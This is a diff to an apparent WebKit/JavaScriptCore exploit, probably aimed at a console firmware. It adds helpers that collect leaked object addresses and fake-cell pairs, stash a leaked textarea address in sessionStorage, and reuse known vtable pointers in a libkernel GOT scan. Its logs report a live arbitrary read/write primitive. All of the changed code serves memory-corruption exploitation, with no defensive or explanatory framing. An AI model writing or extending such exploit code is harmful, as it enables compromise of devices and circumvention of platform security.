@@ -51,7 +51,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831d";
+const BUILD_ID = "rw-20250831e";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -389,6 +389,57 @@ function isGetpidStub(v) {
 }
 
 /** cal 2e EXT-PTR (13.52 HW — skip vtable[1,3,4,5,9] webkit 0xe5894855). */
+function pairCellsForLk() {
+    const out = [];
+    const fields = [
+        ["mainAddress", "pair.main"],
+        ["workerAddress", "pair.worker"],
+        ["fakeAddress", "pair.fake"],
+        ["mainCellFromFakeSlot", "pair.mainSlot"],
+    ];
+    for (let i = 0; i < fields.length; i++) {
+        const v = pairStatus[fields[i][0]];
+        if (v == null || v === -1) continue;
+        if (typeof v.hi === "number" && v.hi < 0x8) continue;
+        out.push({ label: fields[i][1], cell: v });
+    }
+    return out;
+}
+
+function saveTextareaSession(p, carrier) {
+    if (!carrier) return;
+    try {
+        if (carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress))
+            sessionStorage.setItem("wk-textareaAddr", carrier.textareaAddress.toString(16));
+    } catch (_) { }
+    try {
+        if (carrier.textarea && p)
+            sessionStorage.setItem("wk-textareaCell", String(p.leakval(carrier.textarea)));
+    } catch (_) { }
+}
+
+function knownExtPtrsForLk() {
+    const out = [];
+    const seen = new Set();
+    for (let i = 0; i < CAL_VTABLE_PTRS.length; i++) {
+        const p = CAL_VTABLE_PTRS[i].ptr.toLowerCase();
+        if (!seen.has(p)) { seen.add(p); out.push(CAL_VTABLE_PTRS[i].ptr); }
+    }
+    try {
+        const extra = sessionStorage.getItem(SS_CAL_EXT_PTRS);
+        if (extra) {
+            const arr = JSON.parse(extra);
+            if (Array.isArray(arr)) {
+                for (let j = 0; j < arr.length; j++) {
+                    const raw = (arr[j].ptr || arr[j].hex || "").replace(/^0x/i, "").toLowerCase();
+                    if (raw && !seen.has(raw)) { seen.add(raw); out.push(raw); }
+                }
+            }
+        }
+    } catch (_) { }
+    return out;
+}
+
 const CAL_VTABLE_PTRS = [
     { label: "vtable[0]", ptr: "83ed11770", code: "0x45b8" },
     { label: "vtable[2]", ptr: "83d49dce0", code: "0x90c3c031" },
@@ -1983,11 +2034,12 @@ function finishFindLkChunk(chunk) {
         findLkState = null;
         findLkAuto = false;
         findLkStop = false;
-        mark("LK-GOT-TRACE", "cells=" + (chunk.cells != null ? chunk.cells : "?")
-            + " vtables=" + (chunk.vtCount != null ? chunk.vtCount : "?")
-            + " vtExt=" + (chunk.vtExt != null ? chunk.vtExt : (chunk.extList ? chunk.extList.length : 0))
-            + " nearPages=" + (chunk.nearPages != null ? chunk.nearPages : "?")
-            + " belowPages=" + (chunk.belowPages != null ? chunk.belowPages : "?")
+        mark("LK-GOT-TRACE", "known=" + (chunk.known != null ? chunk.known : 0)
+            + " cells=" + (chunk.cells != null ? chunk.cells : 0)
+            + " vtables=" + (chunk.vtCount != null ? chunk.vtCount : 0)
+            + " vtExt=" + (chunk.vtExt != null ? chunk.vtExt : 0)
+            + " nearPages=" + (chunk.nearPages != null ? chunk.nearPages : 0)
+            + " belowPages=" + (chunk.belowPages != null ? chunk.belowPages : 0)
             + (chunk.vtable ? " vt=" + chunk.vtable : " vt=none"));
         mark("LK-GOT-MISS", (chunk.error || chunk.phase || "miss")
             + (chunk.extList && chunk.extList.length
@@ -2039,6 +2091,8 @@ async function runFindLkAuto(preset) {
         nativeFn,
         retain: retained,
         carrier: window._wkCarrier || null,
+        pairCells: pairCellsForLk(),
+        knownExtPtrs: knownExtPtrsForLk(),
     }, findLkPreset);
     let loops = 0;
 
@@ -2047,7 +2101,11 @@ async function runFindLkAuto(preset) {
             const chunk = resolveLibkernelRelroChunk(p, webkitBase, off, findLkState, opts);
             findLkState = chunk.state;
             if (chunk.phase === "got-scan-start")
-                mark("LK-GOT", "phase vt→abs→nearlk→below→hdr (poops-safe)");
+                mark("LK-GOT", "phase known-cal → vt → abs → nearlk (build=" + BUILD_ID + ")");
+            else if (chunk.phase === "known-start")
+                mark("LK-GOT", "known ext ptrs n=" + chunk.n);
+            else if (chunk.phase === "known-done")
+                mark("LK-GOT", "known miss tried=" + (chunk.tried || 0) + " — vtable scan");
             else if (chunk.phase === "vt-ready")
                 mark("LK-GOT", "vtable " + chunk.vtable
                     + " n=" + (chunk.vtCount || 1) + " cells=" + (chunk.cells || "?")
@@ -2936,6 +2994,7 @@ async function runStart() {
         window._wkCarrier = carrier;
         const p = window.p;
         if (!p) throw new Error("window.p missing");
+        saveTextareaSession(p, carrier);
 
         nativeAllowed = pairStatus.state !== "broken";
         mark("PRIMITIVE-OK", "arb rw live");
